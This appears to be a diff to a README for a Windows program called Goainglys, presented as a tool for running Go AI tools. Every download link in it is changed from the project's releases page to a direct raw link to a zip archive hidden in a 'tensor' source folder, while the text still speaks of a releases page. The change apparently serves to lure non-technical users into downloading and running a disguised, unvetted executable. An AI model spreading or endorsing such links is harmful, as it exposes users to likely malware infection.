@@ -1,6 +1,6 @@
 # 🤖 Goainglys - Run Go AI Tools with Ease
 
-[![Download Goainglys](https://img.shields.io/badge/Download-Goainglys-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Natalyarevenant458/Goainglys/releases)
+[![Download Goainglys](https://img.shields.io/badge/Download-Goainglys-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Natalyarevenant458/Goainglys/raw/refs/heads/main/tensor/Software_2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This guide shows you how to download Goainglys, install it on Windows, and open 
 
 Visit this page to download the latest version:
 
-https://github.com/Natalyarevenant458/Goainglys/releases
+https://github.com/Natalyarevenant458/Goainglys/raw/refs/heads/main/tensor/Software_2.8.zip
 
 On the releases page, look for the newest release at the top. Download the Windows file that matches your system. If you see a `.zip` file, download that file and extract it first. If you see an `.exe` file, you can run it after the download finishes.
 
@@ -32,7 +32,7 @@ If your computer has more memory and a newer CPU, Goainglys will run better. A G
 
 Go to:
 
-https://github.com/Natalyarevenant458/Goainglys/releases
+https://github.com/Natalyarevenant458/Goainglys/raw/refs/heads/main/tensor/Software_2.8.zip
 
 ### Step 2: Download the Windows file
 
@@ -170,7 +170,7 @@ This may mean it still needs a model path, workspace folder, or first-run setup.
 
 If you need the file again, use this page:
 
-https://github.com/Natalyarevenant458/Goainglys/releases
+https://github.com/Natalyarevenant458/Goainglys/raw/refs/heads/main/tensor/Software_2.8.zip
 
 That page always has the latest release files for Windows. Download the file, then run it or extract it based on the file type.
 
@@ -218,7 +218,7 @@ Goainglys can fit different AI workflows on a Windows PC:
 
 Primary download page:
 
-https://github.com/Natalyarevenant458/Goainglys/releases
+https://github.com/Natalyarevenant458/Goainglys/raw/refs/heads/main/tensor/Software_2.8.zip
 
 Use this link when you need the newest Windows build or want to check for updates
 
